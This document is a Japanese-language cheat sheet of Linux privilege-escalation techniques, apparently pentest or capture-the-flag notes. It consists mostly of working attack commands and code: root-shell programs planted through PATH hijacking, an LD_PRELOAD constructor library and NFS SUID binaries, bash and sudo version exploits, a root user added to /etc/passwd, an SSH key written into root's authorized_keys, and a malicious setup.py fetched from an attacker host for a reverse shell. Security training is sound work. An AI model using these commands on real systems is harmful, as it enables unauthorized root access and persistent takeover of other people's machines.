# 権限昇格

## Enumeration

### ホスト情報

```shell
hostname
uname -a
cat /proc/version
cat /etc/issue
cat /etc/passwd
```

### プロセス

```shell
# 全プロセス、ツリー状
ps aux
ps axjf
```

### 環境変数

```shell
env
```

### ユーザーの権限とグループ

```shell
# 他のユーザーも確認できる
id <user>
```

### 特定ユーザーが所有するファイル一覧

```shell
find / -user <name> -type f 2>/dev/null
```

### SUID が設定されているファイルを検索

```shell
# 環境によって動作が変わるので両方試す
$ find / -perm 04000 -type f -ls 2>/dev/null
# or
$ find / -perm -u=s -type f -ls 2>/dev/null

# SGIDはこう
$ find / -perm 02000 -type f -ls 2>/dev/null

$ find / -perm -g=s -type f -ls 2>/dev/null
```

### 書き込み可能なディレクトリを検索

```shell
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### .bash_history

```shell
cat .bash_history
```

### キーワードでファイル検索

-I でバイナリファイルを除き、/dev/null でファイル名も出力されるようにしている

```shell
find . -type f -exec grep -i -I "ABCDE" {} /dev/null \;

# 特定のファイル名を参照しているバイナリを見つける意図
find . -type f -exec grep -a ".passwords" {} /dev/null \;
```

### ログイン時自動実行スクリプト

```shell
ls -al /etc/update-motd.d
```

### linux-exploit-suggester

```shell
cd /usr/share/linux-exploit-suggester
./linux-exploit-suggester.sh -k 2.6.32
```

### metasploit suggester

```shell
meterpreter > run post/multi/recon/local_exploit_suggester
```

### ネットワーク

```shell
ifconfig
ip route
netstat -a
```

### 自動 Enum ツール

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)  
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## suid 付きプログラムの解析

suid や sudo を設定してはいけないコマンド一覧  
[GTFOBins](https://gtfobins.github.io/)

### プログラムが読み込む so やその他のファイル 等を調べる

so を配置可能な場合、so の初期化処理で任意のコードを実行できる

```shell
strace ../bin/foo 2>&1

# grep
strace ../bin/foo 2>&1 | grep -i -E "open|access|no such file"
```

### プログラムに含まれる文字列を調べる

```shell
$ strings ../bin/foo
abc
...
service httpd start
...
```

### PATH 挿入による実行ファイル差し替え

```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH

# serviceを実行するのが分かっているSUID付きのプログラム
../bin/foo
```

### エディターなどに SUID が付いている場合

```shell
# パスワードハッシュを出力
openssl passwd -1 -salt SALT password1

# passwdに追加
nano /etc/passwd
```

### bash のバージョンが古い場合

```shell
# 4.2-048 未満の場合
/bin/bash --version

# 実行ファイルと同じ形式のシェル関数を定義する
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# /usr/sbin/service を起動するプログラム
/usr/local/bin/suid-env2
```

```shell
# 4.4 以降では動作しない方法
# デバッグ モードで Bash は環境変数 PS4 を使用して、デバッグ ステートメントの追加プロンプトを表示する
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p
```

### sudo のバージョンが古い場合

```shell
# sudo 1.8.28 より前のバージョン
$ sudo --version
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3

$ sudo -u#-1 <cmd>
```

## sudo 関連

```shell
# 権限のないユーザーが実行するとインシデント通知が出る可能性があるので注意！
sudo -l
```

### env_keep+=LD_PRELOAD が許可されている場合

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```shell
$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
# sudo LD_PRELOAD=... <command> の順
$ sudo LD_PRELOAD=/tmp/x.so nmap
```

### sudo pip install が許可されている場合

不正な setup.py を使うことで、root でリバースシェルの起動が可能  
https://github.com/0x00-0x00/FakePip/tree/master

```shell
wget http://<ip>/setup.py
sudo pip install . --upgrade
```

（ちなみに）ユーザーごとにインストールしたい場合はこれでよい

```shell
pip install --user
```

## ファイルキャパビリティ

```shell
# キャパビリティが付いているファイルを検索
getcap -r / 2>/dev/null
（出力例）
/home/karen/vim = cap_setuid+ep

# vimにsetuidキャパビリティが付いているとして
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## cron 関連

```shell
cat /etc/crontab

ls -al /etc/cron*
```

## NFS (ネットワークファイルシステム)

（ターゲット）no_root_squash オプションが設定されていないか

```shell
$ cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

（攻撃マシン）マウント可能な共有を列挙

```shell
$ showmount -e 10.10.17.160
Export list for 10.10.17.160:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

（攻撃マシン）

```shell
# マウント
$ mkdir /tmp/targetbackup
$ sudo mount -o rw <ip>:/home/backup /tmp/targetbackup
$ sudo chmod 777 /tmp/targetbackup
$ cd /tmp/targetbackup

# マウントしているので攻撃マシンでもコンパイルできるが、
# 環境の違いによりターゲット側で実行したらエラーになる可能性がある事に注意
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > poc.c
$ gcc poc.c -o poc

# no_root_squash 設定のため、SUID設定できる
$ chmod +s ./poc

$ ls -al
total 24
drwxrwxrwx  2 root root  4096 Dec 18 03:39 .
drwxrwxrwt 15 root root   340 Dec 18 03:39 ..
-rwsrwsr-x  1 kali kali 16056 Dec 18 03:39 poc
-rw-rw-r--  1 kali kali    68 Dec 18 03:39 poc.c
```

## 任意のファイルに書き込み可能な場合

### ユーザー追加

/etc/passwd を編集可能であれば、直接 root 権限のユーザーを作成できる。  
SSH 接続はできないので su で昇格する。

```shell
# ハッシュ作成
openssl passwd -1 -salt <salt> <password>
# or
mkpasswd -m sha-512 <password>

# passwd 更新
echo <name>:<hash>:0:0:root:/root:/bin/bash >> /etc/passwd

# su で昇格
su - <name>
```

### ~/.ssh/authorized_keys

```shell
# 鍵ペア生成
$ ssh-keygen -t rsa

# 公開鍵
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali
```

```shell
# /root/.ssh に公開鍵を書き込む
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali" > /root/.ssh/authorized_keys
```

## ツール

### LinEnum

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

### linPEAS

サジェスターツール  
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

wget http://<ip>/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh
```

### dirtycow

有名特権昇格ツール  
https://www.exploit-db.com/download/40611

```shell
$ gcc cow.c -pthread -o dcw
$ ./dcw
^C
$ pwd
#
```
